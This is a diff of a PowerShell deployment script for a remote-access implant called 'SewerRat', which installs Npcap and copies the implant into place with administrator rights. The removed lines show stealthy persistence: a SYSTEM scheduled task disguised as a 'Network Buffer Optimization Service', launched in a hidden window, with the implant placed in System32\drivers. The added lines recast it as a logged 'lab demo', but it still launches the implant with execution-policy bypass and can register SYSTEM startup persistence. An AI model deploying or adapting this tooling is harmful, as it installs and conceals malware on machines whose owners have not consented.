@@ -1,3 +1,8 @@
+# Enable verbose logging for this lab deployment.
+param(
+    [switch]$Persist
+)
+
 # ============================================================================
 # SewerRat PowerShell Deployment Script
 # REQUIRES: Administrator Privileges
@@ -13,13 +18,27 @@ $ScriptDir = $PSScriptRoot
 if ([string]::IsNullOrEmpty($ScriptDir)) { $ScriptDir = "." }
 
 $LocalImplant = Join-Path $ScriptDir "SewerRat.exe"
-$DestPath = "C:\Windows\System32\drivers\SewerRat.exe"
+$LabRoot = "C:\ProgramData\SewerRatLab"
+$LogDir = Join-Path $LabRoot "logs"
+$DestPath = Join-Path $LabRoot "SewerRat.exe"
 $LocalNpcap = Join-Path $ScriptDir "npcap-1.87.exe"
-$ServiceName = "Win32NetworkBuffer"
+$ServiceName = "SewerRatLabDemo"
+$StopFile = Join-Path $LabRoot "STOP"
+
+New-Item -Path $LabRoot -ItemType Directory -Force | Out-Null
+New-Item -Path $LogDir -ItemType Directory -Force | Out-Null
+
+$TranscriptPath = Join-Path $LogDir ("deploy-" + (Get-Date -Format "yyyyMMdd-HHmmss") + ".log")
+Start-Transcript -Path $TranscriptPath -Append | Out-Null
+
+Write-Host "[AUDIT] Lab root: $LabRoot"
+Write-Host "[AUDIT] Deployment transcript: $TranscriptPath"
+Write-Host "[AUDIT] Local stop file (create this to stop future command execution): $StopFile"
 
 Write-Host "[*] Checking for Npcap installer at $LocalNpcap..."
 if (-Not (Test-Path $LocalNpcap)) {
     Write-Host "[-] local Npcap installer not found! Make sure to transfer it."
+    Stop-Transcript | Out-Null
     exit
 }
 
@@ -38,6 +57,7 @@ try {
 Write-Host "[*] Checking for SewerRat implant at $LocalImplant..."
 if (-Not (Test-Path $LocalImplant)) {
     Write-Host "[-] local SewerRat implant not found! Make sure to transfer it."
+    Stop-Transcript | Out-Null
     exit
 }
 
@@ -47,47 +67,49 @@ try {
     Write-Host "[+] Implant copied successfully: $DestPath"
 } catch {
     Write-Host "[-] Failed to copy implant: $_"
+    Stop-Transcript | Out-Null
     exit
 }
 
-Write-Host "[*] Creating persistence via Scheduled Task '$ServiceName'..."
+Write-Host "[*] Starting the implant process explicitly in demo mode..."
 try {
-    # If the task already exists, unregister it
-    if (Get-ScheduledTask -TaskName $ServiceName -ErrorAction SilentlyContinue) {
-        Write-Host "[!] Scheduled task already exists. Cleaning up old task..."
-        Unregister-ScheduledTask -TaskName $ServiceName -Confirm:$false
-        Start-Sleep -Seconds 2
+    $StartArgs = @(
+        "-NoProfile",
+        "-ExecutionPolicy", "Bypass",
+        "-Command",
+        "`$env:SEWERRAT_DEMO_MODE='1'; `$env:SEWERRAT_LAB_DIR='$LabRoot'; `$env:SEWERRAT_AUDIT_DIR='$LogDir'; `$env:SEWERRAT_STOP_FILE='$StopFile'; & '$DestPath'"
+    )
+    Start-Process -FilePath "powershell.exe" -ArgumentList $StartArgs
+    Write-Host "[+] Lab implant launched with visible audit settings."
+} catch {
+    Write-Host "[-] Failed to start implant directly: $_"
+}
+
+if ($Persist) {
+    Write-Host "[*] Creating visible persistence via Scheduled Task '$ServiceName'..."
+    try {
+        if (Get-ScheduledTask -TaskName $ServiceName -ErrorAction SilentlyContinue) {
+            Write-Host "[!] Scheduled task already exists. Cleaning up old task..."
+            Unregister-ScheduledTask -TaskName $ServiceName -Confirm:$false
+            Start-Sleep -Seconds 2
+        }
+
+        $TaskCommand = "`$env:SEWERRAT_DEMO_MODE='1'; `$env:SEWERRAT_LAB_DIR='$LabRoot'; `$env:SEWERRAT_AUDIT_DIR='$LogDir'; `$env:SEWERRAT_STOP_FILE='$StopFile'; & '$DestPath'"
+        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -Command $TaskCommand"
+        $Trigger = New-ScheduledTaskTrigger -AtStartup
+        $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Hours 1)
+
+        Register-ScheduledTask -TaskName $ServiceName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Description "SewerRat lab demo process with explicit audit logging" | Out-Null
+        Write-Host "[+] Scheduled Task created successfully."
+    } catch {
+        Write-Host "[-] Failed to create Scheduled Task: $_"
+        Stop-Transcript | Out-Null
+        exit
     }
-
-    # Setup the Action (what to run) -> hidden PowerShell to spawn it silently
-    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"`& '$DestPath'`""
-
-    # Setup the Trigger (when to run) -> At startup
-    $Trigger = New-ScheduledTaskTrigger -AtStartup
-
-    # Setup the Principal (who to run as) -> SYSTEM user with highest privileges
-    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-
-    # Setup the Settings -> Allow it to run indefinitely and don't kill it after 3 days
-    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Days 0)
-
-    # Register the Scheduled Task
-    Register-ScheduledTask -TaskName $ServiceName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Description "Network Buffer Optimization Service for Startup" | Out-Null
-
-    Write-Host "[+] Scheduled Task created successfully."
-
-} catch {
-    Write-Host "[-] Failed to create Scheduled Task: $_"
-    exit
-}
-
-Write-Host "[*] Starting the implant process explicitly..."
-try {
-    # Start the task manually so it runs right now without needing a reboot
-    Start-ScheduledTask -TaskName $ServiceName
-    Write-Host "[+] Task triggered successfully! SewerRat is now running silently."
-} catch {
-    Write-Host "[-] Failed to trigger task: $_"
+} else {
+    Write-Host "[*] Persistence disabled by default for this contained demo. Re-run with -Persist only if you need it."
 }
 
 Write-Host "[*] Deployment complete!"
+Stop-Transcript | Out-Null
